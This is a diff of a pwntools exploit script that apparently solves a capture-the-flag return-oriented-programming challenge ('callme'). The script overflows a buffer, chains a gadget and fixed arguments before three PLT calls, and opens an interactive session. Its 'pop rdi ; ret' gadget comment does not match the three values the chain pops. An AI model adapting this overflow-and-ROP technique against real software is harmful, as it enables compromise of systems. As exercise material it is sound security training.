@@ -1,26 +1,37 @@
 from pwn import *
 
-context.bits = 64
+context.log_level="debug"
 
-p = process("./callme")
+elf = context.binary = ELF("callme")
 
-gadget = p64(0x000000000040093c)
+gs = '''
+break main
+'''
 
-deadbeef = p64(0xdeadbeefdeadbeef)
-cafebabe = p64(0xcafebabecafebabe)
-doodfood = p64(0xd00df00dd00df00d)
+def start():
+    if args.GDB:
+        return gdb.debug(elf.path, gdbscript=gs)
+    else:
+        return process(elf.path)
 
-arguments = deadbeef + cafebabe + doodfood
+def prepare_args():
+    stack  = p64(0x00040093c)           # pop rdi ; ret
+    stack += p64(0xdeadbeefdeadbeef)
+    stack += p64(0xcafebabecafebabe)
+    stack += p64(0xd00df00dd00df00d)
+    return stack
 
-overwrite = b"A" * 40
+io = start()
+io.recvuntil(b"> ")
 
-callme1 = p64(0x0000000000400720)
-callme2 = p64(0x0000000000400740)
-callme3 = p64(0x00000000004006f0)
+payload  = b"A" * 40 
+payload += prepare_args()
+payload += p64(elf.plt.callme_one)
+payload += prepare_args()
+payload += p64(elf.plt.callme_two)
+payload += prepare_args()
+payload += p64(elf.plt.callme_three)
 
-payload = overwrite + gadget + arguments + callme1
-payload += gadget + arguments + callme2
-payload += gadget + arguments + callme3
+io.sendline(payload)
 
-p.sendline(payload)
-p.interactive()
+io.interactive()
